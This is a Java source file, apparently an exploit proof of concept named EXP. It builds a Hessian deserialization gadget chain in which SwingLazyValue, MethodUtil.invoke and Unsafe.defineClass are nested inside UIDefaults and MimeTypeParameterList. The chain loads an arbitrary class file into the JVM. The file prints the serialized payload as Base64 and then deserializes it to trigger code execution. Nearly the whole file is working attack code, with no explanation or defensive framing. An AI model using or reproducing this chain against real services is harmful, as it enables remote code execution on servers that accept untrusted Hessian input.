import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import javafx.beans.binding.ObjectExpression;
import sun.misc.Unsafe;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.ProtectionDomain;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class EXP {
    public static void main(String[] args) throws IOException, NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, ClassNotFoundException, InstantiationException {
        byte[] code = Files.readAllBytes(Paths.get("D://tmp//classes//Calc.class"));
        Method defineClass = Unsafe.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);

        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Field declaredField = Unsafe.class.getDeclaredField("theUnsafe");
        declaredField.setAccessible(true);
        Object unsafe = declaredField.get(null);

        Object[] arg = {invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{"Calc", code, 0, code.length, null, null}}};
        Object[] ag = new Object[]{defineClass, unsafe, new Object[]{"Calc", code, 0, code.length, null, null}};
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", arg);
//        swingLazyValue.createValue(new UIDefaults());





        SwingLazyValue calc = new SwingLazyValue("Calc", null, null);
//        calc.createValue(new UIDefaults());
        UIDefaults uiDefaults1 = new UIDefaults();
        UIDefaults uiDefaults2 = new UIDefaults();
        uiDefaults1.put("any", swingLazyValue);
        uiDefaults2.put("any", calc);

        MimeTypeParameterList mime1 = new MimeTypeParameterList();
        setFieldValue(mime1, "parameters", uiDefaults1);
        MimeTypeParameterList mime2 = new MimeTypeParameterList();
        setFieldValue(mime2, "parameters", uiDefaults2);

        byte[] ser = ser(mime1);
        byte[] ser1 = ser(mime2);
        System.out.println(Base64.getEncoder().encodeToString(ser));
        deser(ser);
        deser(ser1);


    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(fieldName);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }

    public static byte[] ser(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);

        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(obj);
        output.close();
        return baos.toByteArray();

    }

    public static Object deser(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        Hessian2Input hessian2Input = new Hessian2Input(bais);
        Object o = hessian2Input.readObject();
        hessian2Input.close();
        return o;
    }
}
